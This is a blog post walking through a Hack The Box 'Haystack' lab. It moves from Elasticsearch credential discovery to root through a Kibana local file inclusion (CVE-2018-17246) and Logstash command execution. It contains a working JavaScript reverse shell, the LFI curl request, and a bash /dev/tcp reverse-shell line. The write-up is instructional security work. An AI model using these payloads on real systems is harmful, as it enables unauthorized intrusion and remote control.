<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Hack The Box - Haystack &middot; Ryan Kozak
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Hack The Box - Haystack | Ryan Kozak</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Hack The Box - Haystack" />
<meta name="author" content="Ryan Kozak" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="hacking, web development, $other" />
<meta property="og:description" content="hacking, web development, $other" />
<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" />
<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" />
<meta property="og:site_name" content="Ryan Kozak" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-11-02T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Haystack" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Hack The Box - Haystack","dateModified":"2021-06-23T16:11:24+00:00","datePublished":"2019-11-02T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-haystack-writeup/"},"url":"http://0.0.0.0:4000/hack-the-box-haystack-writeup/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Ryan Kozak
      </a>
    </div>
    <p class="lead">hacking, web development, $other</p>
  </header>
  <nav id="sidebar-nav-links">

  
    <a class="home-link "
        href="/">Home</a>
  

  

  

  


  
    
  

  
    
    	
      		<a class="page-link " href="/about/">About</a>
    	
    
  

  
    
    	
      		<a class="page-link " href="/contact/">Contact</a>
    	
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
    	
      		<a class="page-link " href="/books/index.html">Book List</a>
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  



  


  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  

  
  <!-- Optional additional links to insert in sidebar nav -->


</nav>


  <nav id="sidebar-icon-links">
  
    <a id="github-link"
       class="icon" title="Github Profile" aria-label="Github Profile"
       href="https://github.com/d0n601">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
</svg>

    </a>
  

  
  <a id="stackoverflow-link"
     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
     href="https://stackoverflow.com/users/4681506/ryan-kozak">
    <?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCBBBB;}
	.st1{fill:#F48023;}
</style>
<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
</svg>

  </a>
  

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>
 
  <p class="copyright">
  &copy; 2021 Ryan Kozak.
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Hack The Box - Haystack</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">02 Nov 2019</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        CTF Writeup
      
    
      &bull;

      
      
      

      
        Security
      
    
  </span>
</div>

  <div class="post-body">
    <p><img src="/wp-content/uploads/2019/08/haystack/badge.png" alt="Hack The Box Haystack" /></p>

<h1 id="intro">Intro</h1>
<p>Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn’t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren’t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.115
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
Nmap scan report for 10.10.10.115
Host is up (0.38s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
</span><span class="gp">|_http-title: Site doesn't have a title (application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
</span></code></pre></div></div>

<p>Ports open <strong>22</strong>, <strong>80</strong>, and <strong>9200</strong>.</p>

<h2 id="the-needle-port-80">The Needle: Port 80</h2>
<p>We see that there’s an Nginix page hosting only an image. This is a CTF after all, so let’s check and see if there’s anything hidden in this picture.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/port80.png" alt="Port 80" />
<strong>Figure 1:</strong> needle.jpg displayed on port 80.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span>strings <span class="nt">-10</span> needle.jpg
<span class="go">paint.net 4.1.1
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
</span><span class="gp">&gt;</span>S<span class="o">)</span>T<span class="p">;</span>M7<span class="se">\{</span>Y
<span class="gp">WEL/;</span>wg-J3
<span class="go">T.-UWuvFG,
</span><span class="gp">Euw!i$</span>goRk
<span class="gp">5)5=FI$</span>b[<span class="o">=</span>+
<span class="gp">*Oo!;</span>.o|?&gt;
<span class="go">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
</span><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span><span class="nb">echo </span><span class="nv">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">la aguja en el pajar es "clave"
</span></code></pre></div></div>

<p>We see that there is a <code class="highlighter-rouge">base64</code> encoded string in this <code class="highlighter-rouge">.jpg</code>. When we decode that we get the following message.</p>

<blockquote>
  <p>la aguja en el pajar es “clave”</p>
</blockquote>

<p>Translated to English this becomes,</p>

<blockquote>
  <p>the needle in the haystack is “key”</p>
</blockquote>

<h2 id="they-haystack-port-9200-elasticsearch">They Haystack: Port 9200 (Elasticsearch)</h2>
<p>The Elasticsearch database is where the haystack resides. When it’s queried we see that it’s version <code class="highlighter-rouge">6.4.2</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl http://10.10.10.115:9200
<span class="go">{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",C
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</span></code></pre></div></div>

<p>This version should have a local file inclusion vulnerability <code class="highlighter-rouge">CVE-2018-17246</code>, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for <code class="highlighter-rouge">key</code>, nothing comes up. Using Spanish though, and making the query for <code class="highlighter-rouge">clave</code>, it returns some interesting records.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span>curl <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.115:9200/_search?q=clave"</span>
<span class="go">{"took":23,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
</span></code></pre></div></div>

<p>Let’s decode these two base64 strings and see what they’re saying.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">echo </span>dXNlcjogc2VjdXJpdHkg | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">user: security
</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">echo </span><span class="nv">cGFzczogc3BhbmlzaC5pcy5rZXk</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">pass: spanish.is.key
</span></code></pre></div></div>

<p>Now we have a user name and some credentials.</p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="user-flag">User Flag</h2>

<p>Using the credentials found in the Elasticsearch database we’re able to ssh into the box and gain the user flag.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack ~]$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">04d18bc79dac1d4d48ee0a940c8eb929
</span></code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>
<p>It may be intuitive that we’re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.</p>

<p><code class="highlighter-rouge">[security@haystack tmp]$ ps -elf|grep root</code></p>

<p><img src="/wp-content/uploads/2019/08/haystack/elk_is_root.png" alt="ELK is root" />
<strong>Figure 2:</strong> Logstash is running as root.</p>

<p>It’s now clear to us that <code class="highlighter-rouge">logstash</code>, which is the <code class="highlighter-rouge">L</code> in <code class="highlighter-rouge">ELK</code>, is running as root. When we attempt to view the current configuration files for <code class="highlighter-rouge">logstash</code> we see that the <code class="highlighter-rouge">security</code> user we currently have a shell as isn’t able to read them.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/etc/logstash/conf.d
</span><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 12
drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
</span><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">cat </span>filter.conf
<span class="go">cat: filter.conf: Permission denied
</span></code></pre></div></div>

<h3 id="pivot-to-kibana-user">Pivot to kibana user</h3>

<p>Researching known vulnerabilities in Elasticsearch <code class="highlighter-rouge">6.4.2</code>, we’ve come across <a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a>. The Github user <a href="https://github.com/mpgn">mpgn</a> has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user <code class="highlighter-rouge">kibana</code>, and do more with <code class="highlighter-rouge">logstash</code> than we currently have permission to do.</p>

<p>The javascript reverse shell code provided is as follows. All that’s needed for this to work out of the box is replacing our IP and port that netcat is listening on.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">4444</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10.10.14.19</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>We place the shell code into a directory to which we have access as the <code class="highlighter-rouge">security</code> user. In this case we place the shell into <code class="highlighter-rouge">/dev/shm</code>, and name it <code class="highlighter-rouge">mahshell.js</code>.</p>

<p>We are able to determine that <code class="highlighter-rouge">kibana</code> is running locally on port <code class="highlighter-rouge">5601</code> by reading the <code class="highlighter-rouge">/etc/kibana/kibana.yml</code> file.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/kibana_yml.png" alt="kibana yml" />
<strong>Figure 3:</strong> kibana.yml</p>

<p>We can make the following <code class="highlighter-rouge">curl</code> request to execute our reverse shell code.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack shm]$</span><span class="w"> </span>curl <span class="nt">-X</span> GET <span class="s2">"localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/mahshell.js"</span> <span class="nt">-H</span> <span class="s2">"kbn-xsrf: true"</span>
</code></pre></div></div>

<p><img src="/wp-content/uploads/2019/08/haystack/kibana_user.png" alt="kibana user" />
<strong>Figure 4</strong>: Shell as kibana user.</p>

<p>Now that we are the user <code class="highlighter-rouge">kibana</code>, we go back to the configuration files under <code class="highlighter-rouge">/etc/logstash/conf.d</code> and check out what <code class="highlighter-rouge">filter.conf</code> contains.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">cd</span> /etc/logstash/conf.d
<span class="go">cd /etc/logstash/conf.d
</span><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 12
drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
</span><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">cat </span>filter.conf
<span class="go">cat filter.conf
filter {
	if [type] == "execute" {
		grok {
</span><span class="gp">			match =&gt;</span><span class="w"> </span><span class="o">{</span> <span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Ejecutar</span><span class="se">\s</span><span class="s2">*comando</span><span class="se">\s</span><span class="s2">*:</span><span class="se">\s</span><span class="s2">+%{GREEDYDATA:comando}"</span> <span class="o">}</span>
<span class="go">		}
	}
}
</span></code></pre></div></div>

<p>This filter allows us to execute commands with the proper input. By placing our own <code class="highlighter-rouge">logstash_x</code> file into the <code class="highlighter-rouge">/opt/kibana</code> directory, we should get command execution.</p>

<p>Our logstash file follows exactly as <code class="highlighter-rouge">filter.conf</code> defines. Small note, our IP address has changed due to reconnecting to the Hack The Box VPN the following day.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.15.201/6666  0&gt;&amp;1
</code></pre></div></div>

<p>After waiting a few seconds, the command to call our reverse shell is executed.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/rooted.png" alt="Rooted" />
<strong>Figure: 5</strong> Rooted</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[root@haystack /]#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d92
</span></code></pre></div></div>

<h1 id="conclusion">Conclusion</h1>
<p>The user flag portion of this box was very CTF like. There’s not much chance that in the real world you’re going to come across a situation where clues are hidden in a <code class="highlighter-rouge">.jpg</code> and then <code class="highlighter-rouge">base64</code> encoded credentials are hidden in a database that contains a large amount of arbitrary data. I did learn from this experience though. This was the first time I’ve had to find a string hidden in an image, and it was my first experience with Elasticsearch queries.</p>

<p>The root portion of this box was rather difficult for me with my lack of experience in the ELK stack. It didn’t take long to find the local file inclusion vulnerability, but leveraging it to get root really required me to research how <code class="highlighter-rouge">logstash</code> and <code class="highlighter-rouge">kibana</code> work. All in all I’m pleased to have completed the box.</p>

<h2 id="references">References</h2>
<ol>
  <li><a href="https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10">https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10</a></li>
  <li><a href="https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file">https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file</a></li>
  <li><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></li>
  <li><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/</a></li>
  <li><a href="https://www.anquanke.com/post/id/168291">https://www.anquanke.com/post/id/168291</a></li>
  <li><a href="https://grokdebug.herokuapp.com/">https://grokdebug.herokuapp.com/</a></li>
</ol>

    



<div class="post-tags">
  
    
    <a href="/tags/#ctf">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">CTF</span>
    </a>
  
    
    <a href="/tags/#hack-the-box">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Hack The Box</span>
    </a>
  
    
    <a href="/tags/#linux">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Linux</span>
    </a>
  
    
    <a href="/tags/#privilege-escalation">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Privilege Escalation</span>
    </a>
  
    
    <a href="/tags/#php">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
